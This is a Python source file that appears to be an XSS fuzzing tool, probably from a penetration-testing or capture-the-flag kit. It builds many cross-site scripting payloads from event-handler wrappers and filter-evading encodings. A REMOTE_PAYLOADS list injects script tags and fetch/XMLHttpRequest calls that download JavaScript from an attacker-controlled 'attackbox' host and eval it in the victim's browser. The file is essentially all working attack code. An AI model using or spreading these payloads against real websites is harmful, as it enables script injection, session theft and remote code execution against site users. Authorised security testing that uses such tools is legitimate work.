LOCAL_WRAPPERS = [
    ("<script>", "</script>"),
    ("<scr<script>ipt>", "</scr<script>ipt>"),
    ('"><script>', "</script>"),
    ('<object/data="', '">'),
    ("<img src=x onerror=", ";>"),
    ("<img src=x onerror=", "//"),
    ("<img src=x oneonerrorrror=", ";>"),
    ("<img src=x oneonerrorrror=", "//"),
    ("<img onerror=eval(src) src=x:", ";>"),
    ('"><img src=x onerror=', ";>"),
    ("<><img src=x onerror=", ";>"),
    ("<IMG SRC=1 ONERROR=", ";>"),
    ('#"><img src=/ onerror=', '>'),
    ("<svgonload=", ">"),
    ("<svg/onload=", ">"),
    ("<svg onload=", "//"),
    ("<svg onload=eval(id) id=", ">"),
    ('"><svg/onload=', ">"),
    ('"><svg/onload=', ""),
    ("<svg><script href=data:,", " />"),
    ("<svg><script>", ""),
    ("<svg><script>", ";"),
    ('<div onpointerover="', '">MOVE HERE</div>'),
    ('<div onpointerdown="', '">MOVE HERE</div>'),
    ('<div onpointerenter="', '">MOVE HERE</div>'),
    ('<div onpointerleave="', '">MOVE HERE</div>'),
    ('<div onpointermove="', '">MOVE HERE</div>'),
    ('<div onpointerout="', '">MOVE HERE</div>'),
    ('<div onpointerup="', '">MOVE HERE</div>'),
    ("<body onload=", ">"),
    ("<input autofocus onfocus", ">"),
    ("<select autofocus onfocus", ">"),
    ("<textarea autofocus onfocus", ">"),
    ("<keygen autofocus onfocus", ">"),
    ("<video/poster/onerror=", ">"),
    ('<video><source onerror="', '">'),
    ('<video src=_ onloadstart="', '">'),
    ('<details/open/ontoggle="', '">'),
    ("<audio src onloadstart=", ">"),
    ("<marquee onstart=", ">"),
    ("<meter value=2 min=0 max=10 onmouseover=", ">2 out of 10</meter>"),
    ("<body ontouchstart=", ">"),
    ("<body ontouchend=", ">"),
    ("<body ontouchmove=", ">"),
    ('<input type="hidden" accesskey="X" onclick="', '">'),
    ('<input type="hidden" oncontentvisibilityautostatechange="', '" style="content-visibility:auto">'),
    ('-', '//'),
    ('; ', ';//'),
    ("data:text/html,<script>", "</script>"),
]

LOCAL_PAYLOADS = [
    (r"console.log(", ")"),
    (r"console.log('", "')"),
    (r'console.log("', '")'),
    (r"(console.log)(", ")"),
    (r"(console.log)('", "')"),
    (r'(console.log)("', '")'),
    (r"\u0063onsole.log('", "')"),
    (r'\63onsole.log("', '")'),
    (r"eval('console.log(\'", "\')')"),
    (r'eval("console.log(\"', '\")")'),
    (r'c&#x6f;ns&#x6f;le.l&#x6f;g&#x28;', '&#x29;'),
    (r'jav&#x61;sc&#x72;ipt&#x3a;c&#x6f;ns&#x6f;le.l&#x6f;g&#x28;', '&#x29;'),
    (r'console.log&lpar;', '&rpar;'),
    (r"java%0ascript:console.log(", ")"),
    (r"java%09script:console.log(", ")"),
    (r"java%0dscript:console.log(", ")"),
]

REMOTE_PAYLOADS = [
    ('<script src="', '"></script>'),
    ('<img src="x" onerror="fetch(\'', '\').then(resp=>resp.text()).then(resp=>eval(resp))" />'),
    ('<img src="x" onerror="r=new XMLHttpRequest();r.open(\'GET\',\'', '\',false);r.send(null);eval(r.responseText);" />'),
    ('<svg/onload="fetch(\'', '\').then(resp=>resp.text()).then(resp=>eval(resp))">'),
    ('<svg/onload="r=new XMLHttpRequest();r.open(\'GET\',\'', '\',false);r.send(null);eval(r.responseText);">'),
]

def xss_fuzz_labeled(args):
    i = 1

    web_port = "" if args.attackbox_web_port == 80 else f":{args.attackbox_web_port}"
    for p1, p2 in REMOTE_PAYLOADS:
        yield i, "Remote", f"{p1}http://{args.attackbox_ip}{web_port}/x/{i}.js{p2}".encode()
        i += 1

    for w1, w2 in LOCAL_WRAPPERS:
        for p1, p2 in LOCAL_PAYLOADS:
            yield i, "Local", f"{w1}{p1}{i}{p2}{w2}".encode()
            i += 1

def xss_fuzz(args):
    for _, _, payload in xss_fuzz_labeled(args):
        yield payload